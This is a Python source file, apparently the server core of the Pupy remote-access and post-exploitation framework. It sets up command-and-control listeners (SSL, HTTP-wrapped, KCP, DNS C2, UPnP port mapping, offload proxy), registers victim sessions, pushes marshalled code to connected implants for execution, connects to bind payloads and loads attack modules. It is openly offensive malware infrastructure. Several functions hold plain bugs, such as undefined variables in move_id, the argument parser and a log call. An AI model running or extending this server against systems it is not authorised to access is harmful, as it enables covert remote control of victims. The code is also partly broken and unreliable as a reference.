# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from threading import Thread, Event, Lock
from . import PupyService
import imp
import logging
from .PupyErrors import PupyModuleExit, PupyModuleError
from .PupyJob import PupyJob
from .PupyCategories import PupyCategories
from .PupyConfig import PupyConfig
from .PupyService import PupyBindService
from .PupyCompile import pupycompile
from .PupyOutput import Error, Line, Color
from network.conf import transports
from network.transports.ssl.conf import PupySSLAuthenticator
from network.lib.connection import PupyConnectionThread
from network.lib.servers import PupyTCPServer
from network.lib.streams.PupySocketStream import PupySocketStream, PupyUDPSocketStream
from pupylib.utils.rpyc_utils import obtain
from pupylib.utils.network import get_listener_ip_with_local
from pupylib.PupyDnsCnc import PupyDnsCnc
from .PupyTriggers import on_connect
from network.lib.utils import parse_transports_args
from network.lib.base import chain_transports
from network.lib.transports.httpwrap import PupyHTTPWrapperServer
from network.lib.base_launcher import LauncherError
from network.lib.igd import IGDClient, UPNPError
from network.lib.streams.PupySocketStream import PupyChannel
from .PupyWeb import PupyWebServer
from os import path
from shutil import copyfile
from itertools import count, ifilterfalse
from netaddr import IPAddress
from random import randint
from .PupyOffload import PupyOffloadManager
from weakref import ref
import marshal
import network.conf
import rpyc
import shlex
import socket
import errno
import traceback

from .PupyClient import PupyClient

import os.path

class ListenerException(Exception):
    pass

class PupyKCPSocketStream(PupySocketStream):
    def __init__(self, *args, **kwargs):
        PupySocketStream.__init__(self, *args, **kwargs)
        self.KEEP_ALIVE_REQUIRED = 15

class Listener(Thread):
    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None, pproxy=None):
        Thread.__init__(self)
        self.daemon = True

        self.igd = igd
        self.server = None

        self.name = name.lower().strip()
        self.transport = transports[self.name]()
        self.authenticator = self.transport.authenticator() if \
          self.transport.authenticator else None

        self.pupsrv = pupsrv
        self.config = pupsrv.config
        self.httpd = httpd

        # Where to connect
        self.external = external
        self.external_port = None
        self.pproxy = pproxy

        # Where to bind
        self.address = local or ''
        self.igd_mapping = False

        # Is where to connect placed at our PC
        self.local = True

        if httpd and not self.transport.dgram:
            self.transport.server_transport = chain_transports(
                PupyHTTPWrapperServer.custom(server=self.pupsrv),
                self.transport.server_transport
            )

        if args:
            args = [ x.strip() for x in args.split(' ', 1) if x ]
        else:
            args = []

        if not args:
            self.port = randint(20000, 50000)
            self.ipv6 = False
        else:
            if ':' in args[0]:
                ip, port = args[0].rsplit(':', 1)
                try:
                    if '=' in ip:
                        extip, ip = ip.split('=', 1)
                    else:
                        extip = None

                    address = IPAddress(ip)
                    self.address = str(address)

                    if extip:
                        if extip in ('?', 'igd'):
                            self.external = extip
                        else:
                            self.external = str(IPAddress(extip))

                    elif self.address:
                        self.external = self.address

                    self.ipv6 = address.version == 6
                except Exception, e:
                    raise ListenerException('Invalid IP: {} ({})'.format(ip, e))

            else:
                port = args[0]
                self.ipv6 = False

        if self.pproxy:
            self.external = self.pproxy.external

        elif not self.external or self.external in ('?', 'igd') :
            # If IGD enabled then we likely want to have mappings
            # Why to have mappings if our external IP remains empty?
            if self.igd and self.igd.available:
                extip, self.local = get_listener_ip_with_local(
                    external=True,
                    config=pupsrv.config,
                    igd=self.igd
                )

                self.external = str(IPAddress(extip))
            elif self.address and not self.address in ('0.0.0.0', '::'):
                self.external = self.address
            else:
                extip, self.local = get_listener_ip_with_local(
                    config=pupsrv.config,
                    igd=self.igd
                )

                try:
                    self.external = str(IPAddress(extip))
                except:
                    self.external = '127.0.0.1'

        if '=' in port:
            port = [ x.strip() for x in port.split('=', 1) ]
            try:
                self.external_port = int(port[0])
            except:
                raise ListenerException("Invalid external port: {}".format(port[0]))

            try:
                self.port = int(port[1])
            except:
                raise ListenerException("Invalid local port: {}".format(port[1]))
        else:
            try:
                self.port = int(port)
            except:
                raise ListenerException("Invalid local port: {}".format(port[1]))

            self.external_port = self.port

        if self.local:
            self.external_port = self.port

        transport_kwargs = self.transport.server_transport_kwargs

        if len(args) > 1:
            opt_args = parse_transports_args(args[1])
        else:
            opt_args = []

        for val in opt_args:
            val = val.lower()
            if val in t.server_transport_kwargs:
                transport_kwargs[val] = opt_args[val]
            else:
                logging.warning('Unknown transport argument: {}'.format(val))

        self.kwargs = transport_kwargs

        try:
            self.transport.parse_args(self.kwargs)
        except Exception, e:
            logging.exception(e)

    def init(self):
        proxy = None
        method = None

        stream = self.transport.stream
        transport = self.transport.server_transport
        server = self.transport.server
        transport_kwargs = self.transport.server_transport_kwargs
        ipv6 = self.ipv6
        igd = self.igd
        external = self.external
        external_port = self.external_port
        authenticator = self.authenticator

        if self.pproxy:
            if type(authenticator) == PupySSLAuthenticator:
                extra = {
                    'certs': {
                        'ca': authenticator.castr,
                        'cert': authenticator.certstr,
                        'key': authenticator.keystr,
                    }
                }
            else:
                extra = {}

            if stream == PupyUDPSocketStream:
                stream = PupyKCPSocketStream
                method = self.pproxy.kcp
            elif type(authenticator) == PupySSLAuthenticator:
                method = self.pproxy.ssl
            elif stream == PupySocketStream:
                method = self.pproxy.tcp

            server = PupyTCPServer

            authenticator = None
            ipv6 = False
            igd = None
            self.port = 0

        self.server = server(
            PupyService,
            port=self.port, hostname=self.address,
            authenticator=authenticator,
            stream=stream,
            transport=transport,
            transport_kwargs=transport_kwargs,
            pupy_srv=self.pupsrv,
            ipv6=ipv6,
            igd=igd,
            external=external,
            external_port=external_port
        )

        if not ( self.pproxy and method ):
            return

        ## Workaround..
        self.server.listener.close()
        self.server.listener = method(self.external_port, extra=extra)

    def run(self):
        self.server.start()

    def close(self):
        if self.igd and self.igd_mapping:
            try:
                self.igd.DeletePortMapping(
                    self.external_port, self.port)
            except UPNPError as e:
                logging.error(
                    "Couldn't delete IGD Mapping: {}".format(e.description)
                )
            except:
                pass

        if self.server:
            self.server.close()

    def __del__(self):
        self.close()

    def __str__(self):
        if self.port == 0:
            return '{}: pproxy:{}:{}'.format(
                self.name, self.external, self.external_port
            )

        result = str(self.port)
        if self.address:
            result = '{}:{}'.format(
                self.address if not self.ipv6 else '[{}]'.format(self.address),
                self.port
            )

        if self.external and not self.local and self.external != self.address:
            if not self.address:
                result = '0.0.0.0:{}'.format(result)

            result = 'Remote: {}:{} -> Local: {}'.format(
                self.external, self.external_port, result
            )

        if self.kwargs:
            result += ' ' + ' '.join(
                '{}={}'.format(
                    k, v if k != 'password' else '*'*len(v)
                ) for k,v in self.kwargs.iteritems())

        return '{}: {}'.format(self.name, result)


class PupyServer(object):
    SUFFIXES = tuple([
        suffix for suffix, _, rtype in imp.get_suffixes() \
        if rtype == imp.PY_SOURCE
    ])

    def __init__(self, config, credentials):
        self.httpd = None
        self.pupweb = None
        self.clients = []
        self.jobs = {}
        self.jobs_id = 1
        self.clients_lock = Lock()
        self._current_id = []
        self._current_id_lock = Lock()
        self.modules = {}
        self._modules_stats = {}

        self.motd = {
            'fail': [],
            'ok': []
        }

        self.config = config or PupyConfig()
        self.credentials = credentials or PupyCredentials()

        self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
        self.handler = None
        self.handler_registered = Event()
        self.categories = PupyCategories(self)
        self.igd = None
        self.finished = Event()
        self.finishing = Event()
        self._cleanups = []
        self._singles = {}

        self.pproxy = None

        pproxy = self.config.get('pproxy', 'address')
        ca = self.config.get('pproxy', 'ca')
        key = self.config.get('pproxy', 'key')
        cert = self.config.get('pproxy', 'crt')
        via = self.config.get('pproxy', 'via')

        if pproxy and ca and key and cert:
            try:
                self.pproxy = PupyOffloadManager(
                    pproxy, ca, key, cert, via)
                self.motd['ok'].append(
                    'Offload Proxy: proxy={} external={}{}'.format(
                        pproxy,
                        self.pproxy.external,
                        ' via {}'.format(via) if via else ''))
            except Exception, e:
                self.pproxy = None
                logging.exception(e)
                self.motd['fail'].append('Using Pupy Offload Proxy: Failed: {}'.format(e))

        if self.config.getboolean('pupyd', 'httpd'):
            self.httpd = True

        if not self.pproxy:
            try:
                try:
                    igd_url = None
                    igd_enabled = config.getboolean('pupyd', 'igd')
                except ValueError:
                    igd = config.get('pupyd', 'igd')
                    if igd:
                        igd_enabled = True
                        igd_url = igd

                self.igd = IGDClient(
                    available=igd_enabled,
                    ctrlURL=igd_url
                )
                self.motd['ok'].append('IGDClient enabled')
            except UPNPError as e:
                self.motd['fail'].append('IGDClient failed: {}'.format(e))

        self.dnscnc = None

        self.listeners = {}

        dnscnc = self.config.get('pupyd', 'dnscnc')
        if dnscnc and not dnscnc.lower() in ('no', 'false', 'stop', 'n', 'disable'):
            if ':' in dnscnc:
                fdqn, dnsport = dnscnc.split(':')
            else:
                fdqn = dnscnc.strip()
                dnsport = 5454

            try:
                self.dnscnc = PupyDnsCnc(
                    igd=self.igd,
                    config=self.config,
                    credentials=self.credentials,
                    listeners=self.get_listeners,
                    cmdhandler=self.handler,
                    pproxy=self.pproxy,
                )
            except Exception, e:
                logging.error('DnsCNC failed: {}'.format(e))


    def get_listeners(self):
        return self.listeners

    @property
    def address(self):
        # Address of default listener
        for listener in self.listeners.values():
            if listener and listener.address:
                return listener.address

        return ''

    @property
    def port(self):
        # Port of default listener
        for listener in self.listeners.values():
            return listener.port

    def start_webserver(self):
        if not self.config.getboolean('pupyd', 'webserver'):
            return False

        if not self.pupweb:
            self.pupweb = PupyWebServer(self, self.config)
            self.pupweb.start()
            self.handler.display_success('WebServer started')
        else:
            self.handler.display_error('WebServer already started')

        return True

    def create_id(self):
        """ return first lowest unused session id """
        with self._current_id_lock:
            new_id = next(ifilterfalse(self._current_id.__contains__, count(1)))
            self._current_id.append(new_id)
            return new_id

    def move_id(self, dst_id, src_id):
        """ return first lowest unused session id """
        with self.clients_lock:
            if isinstance(dst_id, int):
                dst_client = [ x for x in self.clients if x.desc['id'] == dst_id ]
                if not dst_client:
                    raise ValueError('Client with id {} not found'.format(dst_id))
                dst_client = dst_client[0]
            else:
                dst_client = dst_id

            if isinstance(src_id, int):
                dst_client = [ x for x in self.clients if x.desc['id'] == src_id ]
                if not src_client:
                    raise ValueError('Client with id {} not found'.format(src_id))
                src_client = src_client[0]
            else:
                src_client = src_id

            with self._current_id_lock:
                self._current_id.remove(dst_client.desc['id'])
                self._current_id.append(src_client.desc['id'])

            dst_client.desc['id'] = src_client.desc['id']

    def free_id(self, id):
        with self._current_id_lock:
            try:
                self._current_id.remove(int(id))
            except ValueError:
                logging.debug('Id not found in current_id list: {}'.format(id))

    def register_handler(self, instance):
        """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
        self.handler=instance
        if self.dnscnc:
            self.dnscnc.cmdhandler=instance
        self.handler_registered.set()

    def add_client(self, conn):
        pc = None

        conn.execute(
            'import marshal;exec marshal.loads({})'.format(
                repr(pupycompile(
                    path.join(
                        self.config.root, 'pupylib', 'PupyClientInitializer.py'),
                    path=True, raw=True))))

        uuid = conn.namespace['get_uuid']()

        with self.clients_lock:
            client_id = self.create_id()
            client_info = {}

            try:
                client_info = conn.get_infos()
                client_info = obtain(client_info)
            except:
                client_info = {
                    "launcher" : str(conn.get_infos("launcher")),
                    "launcher_args" : [ x for x in conn.get_infos("launcher_args") ],
                    "transport" : str(conn.get_infos("transport")),
                    "daemonize" : bool(conn.get_infos("daemonize")),
                    "native": bool(conn.get_infos("native")),
                    "sid": conn.get_infos("sid") or '',
                }

            conn_id = obtain(conn._conn._config['connid'])

            try:
                if type(conn_id) is list:
                    address = conn_id[0]
                address = conn_id.rsplit(':',1)[0]

            except:
                address = str(address)

            client_info.update({
                "id": client_id,
                "conn" : conn,
                "address" : address
            })

            client_info.update(obtain(uuid))

            pc = PupyClient(client_info, self)
            self.clients.append(pc)

            if self.handler:
                try:
                    client_ip, client_port = conn_id.rsplit(':', 1)
                except:
                    client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads

                addr = obtain(conn.modules.pupy.get_connect_back_host())
                remote = ' ({}{}:{})'.format(
                    '{} <- '.format(addr) if not '0.0.0.0' in addr else '',
                    client_ip, client_port)

                self.handler.display_srvinfo("Session {} opened ({}@{}){}".format(
                    client_id,
                    client_info.get('user','?'),
                    client_info.get('hostname','?'),
                    remote if client_port != 0 else '')
                )
        if pc:
            on_connect(pc)

    def remove_client(self, conn):
        with self.clients_lock:
            client = [ x for x in self.clients if ( x.conn is conn or x is conn ) ]
            if not client:
                logging.debug('No clients matches request: {}'.format(conn))
                return

            client = client[0]

            self.clients.remove(client)
            self.free_id(client.desc['id'])

            if self.handler:
                self.handler.display_srvinfo('Session {} closed'.format(client.desc['id']))

    def get_clients(self, search_criteria):
        """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
        #if the criteria is a simple id we return the good client

        if not search_criteria:
            return self.clients

        try:
            indexes = set(
                int(x) for x in str(search_criteria).split(',')
            )

            return [
                c for c in self.clients if c.desc['id'] in indexes
            ]
        except Exception, e:
            pass

        if not type(search_criteria) in (str, unicode):
            return

        l=set([])

        if search_criteria=="*":
            return self.clients

        for c in self.clients:
            take = False
            tags = self.config.tags(c.node())
            for sc in search_criteria.split():
                tab = sc.split(":",1)
                #if the field is specified we search for the value in this field
                if len(tab)==2 and tab[0] in c.desc:
                    take=True
                    if not tab[1].lower() in str(c.desc[tab[0]]).lower():
                        take=False
                        break
                elif len(tab)==2 and tab[0] == 'tag' and tab[1] in tags:
                    take = True
                elif len(tab)==2 and tab[0] == 'tags':
                    if '&' in tab[1]:
                        take = all(x in tags for x in tab[1].split('&') if x)
                    else:
                        take = any(x in tags for x in tab[1].split(',') if x)
                elif len(tab)!=2:#if there is no field specified we search in every field for at least one match
                    take=False
                    if tab[0] in tags:
                        take = True
                    else:
                        for k,v in c.desc.iteritems():
                            if type(v) is unicode or type(v) is str:
                                if tab[0].lower() in v.decode('utf8').lower():
                                    take=True
                                    break
                            else:
                                if tab[0].lower() in str(v).decode('utf8').lower():
                                    take=True
                                    break
                        if not take:
                            break
            if take:
                l.add(c)

        return list(l)

    def get_clients_list(self):
        return self.clients

    def iter_modules(self, by_clients=False, clients_filter=None):
        """ iterate over all modules """
        l = []

        clients = None
        if by_clients:
            clients = self.get_clients(clients_filter)
            if not clients:
                return

        files = {}

        self._refresh_modules()
        for module_name in self.modules:
            module = self.get_module(module_name)
            if clients is not None:
                for client in clients:
                    if module.is_compatible_with(client):
                        yield module
                        break
            else:
                yield module

    def get_module_name_from_category(self, path):
        """ take a category virtual path and return the module's name or the path untouched if not found """
        mod = self.categories.get_module_from_path(path)
        if mod:
            return mod.get_name()
        else:
            return path

    def get_aliased_modules(self):
        """ return a list of aliased module names that have to be displayed as commands """
        l=[]
        for m in self.iter_modules():
            if not m.is_module:
                l.append((m.get_name(), m.__doc__))
        return l

    def _refresh_modules(self, force=False):
        files = {}

        paths = set([
            os.path.abspath(x) for x in [
                self.config.root, '.',
            ]
        ])

        for path in paths:
            modules = os.path.join(path, 'modules')
            if not os.path.isdir(modules):
                continue

            for x in os.listdir(modules):
                modname = '.'.join(x.rsplit('.', 1)[:-1])
                modpath = os.path.join(modules, x)

                try:
                    valid = all([
                        x.endswith(self.SUFFIXES),
                        not x.startswith(('__init__', '.')),
                        os.path.isfile(modpath)
                    ])

                    if valid:
                        files[modname] = modpath

                except Exception, e:
                    import logging
                    logging.exception(e)
                    pass

        for modname, modpath in files.iteritems():
            current_stats = os.stat(modpath)

            if not force and modname in self.modules and \
              self._modules_stats[modname] == os.stat(modpath):
                continue

            self._modules_stats[modname] = current_stats

            try:
                self.modules[modname] = imp.load_source(modname, modpath)
            except Exception, e:
                tb = '\n'.join(traceback.format_exc().split('\n')[1:-2])
                error = Line(
                    Error('Invalid module:'),
                    Color(modname, 'yellow'),
                    'at ({}): {}. Traceback:\n{}'.format(
                    modpath, e, tb))
                if self.handler:
                    self.handler.display_srvinfo(error)
                else:
                    self.motd['fail'].append(error)

    def get_module(self, name):
        if not name in self.modules:
            self._refresh_modules(force=True)

        if not name in self.modules:
            raise ValueError('No such module')

        module = self.modules[name]
        class_name = None

        if hasattr(module, "__class_name__"):
            class_name = module.__class_name__
            if not hasattr(module, class_name):
                logging.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(module_name,class_name))

        if not class_name:
            #TODO automatically search the class name in the file
            exit("Error : no __class_name__ for module %s"%module)

        return getattr(module, class_name)

    def module_parse_args(self, module_name, args):
        """ This method is used by the PupyCmd class to verify validity of arguments passed to a specific module """
        module=self.get_module(module_name)
        ps=module(None,None)
        if ps.known_args:
            return ps.arg_parser.parse_known_args(args)
        else:
            return ps.arg_parser.parse_args(args)

    def del_job(self, job_id):
        if job_id is not None:
            job_id=int(job_id)
            if job_id in self.jobs:
                del self.jobs[job_id]

    def add_job(self, job):
        job.id=self.jobs_id
        self.jobs[self.jobs_id]=job
        self.jobs_id+=1

    def get_job(self, job_id):
        try:
            job_id=int(job_id)
        except ValueError:
            raise PupyModuleError("job id must be an integer !")
        if job_id not in self.jobs:
            raise PupyModuleError("%s: no such job !"%job_id)
        return self.jobs[job_id]

    def connect_on_client(self, launcher_args):
        """ connect on a client that would be running a bind payload """
        launcher=network.conf.launchers['connect'](
            connect_on_bind_payload=True
        )

        try:
            launcher.parse_args(shlex.split(launcher_args))
        except LauncherError as e:
            launcher.arg_parser.print_usage()
            return

        try:
            stream=launcher.iterate().next()
        except socket.error as e:
            self.handler.display_error("Couldn't connect to pupy: {}".format(e))
            return

        host = launcher.args.host[0] \
          if type(launcher.args.host) in (list,tuple) else launcher.args.host

        self.handler.display_success('Starting session ({})'.format(host))

        bgsrv=PupyConnectionThread(
            self,
            PupyBindService,
            PupyChannel(stream),
            ping=stream.KEEP_ALIVE_REQUIRED,
            config={
                'connid': host
            })
        bgsrv.start()

    def start(self):
        self.handler_registered.wait()

        listeners = set([
            x.strip() for x in (
                self.config.get('pupyd', 'listen') or 'ssl'
            ).split(',')
        ])

        for name in listeners:
            if name in transports:
                self.add_listener(name, motd=True)
            else:
                self.motd['fail'].append('Unknown transport: {}'.format(name))

        self.handler.add_motd(self.motd)

    def add_listener(self, name, config=None, motd=False):
        if self.listeners and name in self.listeners:
            self.handler.display_warning('Listener {} already registered'.format(name))
            return

        listener_config = config or self.config.get('listeners', name)
        if not listener_config:
            self.handler.display_error('Listener {} is not known'.format(name))
            return

        listener = Listener(
            self,
            name,
            listener_config,
            httpd=self.httpd,
            igd=self.igd,
            local=self.config.get('pupyd', 'address'),
            external=self.config.get('pupyd', 'external'),
            pproxy=self.pproxy
        )

        self.listeners[name] = listener

        error = True
        message = 'Listen: {}'.format(listener)

        try:
            self.listeners[name].init()
            self.listeners[name].start()
            error = False

        except socket.error as e:
            if e.errno == errno.EACCES:
                message = 'Listen: {}: Insufficient privileges to bind'.format(listener)
            elif e.errno == errno.EADDRINUSE:
                message = 'Listen: {}: Address/Port already used'.format(listener)
            elif e.errno == errno.EADDRNOTAVAIL:
                message = 'Listen: {}: No network interface with addresss {}'.format(
                    listener, listener.address)
            else:
                message = 'Listen: {}: {}'.format(listener, e)

        except Exception as e:
            message = '{}: {}'.format(listener, e)
            logging.exception(e)

        if error:
            del self.listeners[name]

        if motd:
            if error:
                self.motd['fail'].append(message)
            else:
                self.motd['ok'].append(message)
        else:
            if error:
                self.handler.display_error(message)
            else:
                self.handler.display_success(message)

    def remove_listener(self, name):
        if not name in self.listeners:
            self.handler.display_warning('{} - is not running'.format(name))
            return

        self.listeners[name].close()
        self.handler.display_srvinfo('Closed: {}'.format(self.listeners[name]))
        del self.listeners[name]

    def register_cleanup(self, cleanup):
        self._cleanups.append(cleanup)

    def single(self, ctype, *args, **kwargs):
        single = self._singles.get(ctype)
        if not single:
            single = ctype(*args, **kwargs)
            self._singles[ctype] = single

        return single

    def stop(self):
        if self.finishing.is_set():
            return
        else:
            self.finishing.set()

        for cleanup in self._cleanups:
            cleanup()

        self._cleanups = []

        for name in self.listeners.keys():
            self.remove_listener(name)

        self.finished.set()
